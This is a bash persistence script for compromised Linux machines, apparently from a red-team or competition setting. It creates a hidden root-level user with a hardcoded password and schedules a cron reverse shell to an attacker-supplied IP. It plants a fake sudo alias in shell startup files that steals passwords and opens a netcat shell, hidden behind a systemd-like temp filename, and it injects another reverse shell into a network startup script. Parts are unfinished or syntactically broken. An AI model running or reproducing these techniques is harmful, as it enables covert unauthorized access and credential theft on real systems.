#!/bin/bash

# Check if we are root
if [[ $EUID -ne 0 ]]; then
	echo "Script not running as root. Setting user-level persistence..."	
	priv=0
else
	echo "Script running as root. Setting root-level persistence..."
	priv=1
fi


echo "Enter in the IP addr that reverse shells should connect back to..."
read connectbackip

# Get current IP addr
host=$(hostname -I | awk '{print $1}')

# check if netcat (good) version installed
checke="$(nc -h 2>&1)"
checkncate="$(ncat -h 2>&1)"

ncversion=0

if [[ $checke == *"-e filename"* ]]; then
	echo "The correct version of nc is installed..."
	ncversion=1
elif [[ $checkncate == *"-e, --exec <command>"* ]]; then
	echo "The correct version of ncat is installed..."
	ncversion=2
else
	echo "nc/ncat is not installed. Skipping persistence that requires nc/ncat..."
fi

# Create root user
if [[ $priv -eq 1 ]]; then
	echo "Adding 'root' user for persistence..."
	useradd -ou 0 -g 0 sys
	passwd sys
	echo "C3Tcyb3r1234!" | passwd --stdin sys
	echo "Successfully created user 'sys' with password 'C3Tcyb3r1234\!' on $host"
fi

# Crontab
echo "Creating crontab for persistence..."
echo "Crontab will connect back to $connectbackip using port 4321"
(crontab -l ; echo "*/3 * * * * /bin/bash -c 'bash -i >& /dev/tcp/$connectbackip/4321 0>&1'") | crontab 2> /dev/null

# bash_rc
if [[ $ncversion == 1 ]]; then
	TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
	cat << EOF > /tmp/$TMPNAME2
	  alias sudo='echo -n "[sudo] password for \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup nc -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
	EOF
elif [[ $ncversion == 2 ]]; then
	TMPNAME2=".systemd-private-b21245afee3b3274d4b2e2-systemd-timesyncd.service-IgCBE0"
	cat << EOF > /tmp/$TMPNAME2
	  alias sudo='echo -n "[sudo] password for \$USER: ";fi;read -s pwd;echo; unalias sudo; echo "\$pwd" | /usr/bin/sudo -S nohup ncat -lvp 1234 -e /bin/bash > /dev/null && /usr/bin/sudo -S '
	EOF
if [[ $ncversion -gt 0 ]]; then
	echo "Creating backdoor in bash_rc for $USER..."
	if [ -f ~/.bashrc ]; then
		cat /tmp/$TMPNAME2 >> ~/.bashrc
	fi
	if [ -f ~/.zshrc ]; then
		cat /tmp/$TMPNAME2 >> ~/.zshrc
	fi
		rm /tmp/$TMPNAME2
else
	echo "Skipping bash_rc backdoor due to lack of nc/ncat..."


# backdoor startup service (fix this)
RSHELL="ncat $LMTHD $LHOST $LPORT -e \"/bin/bash -c id;/bin/bash\" 2>/dev/null"
sed -i -e "4i \$RSHELL" /etc/network/if-up.d/upstart






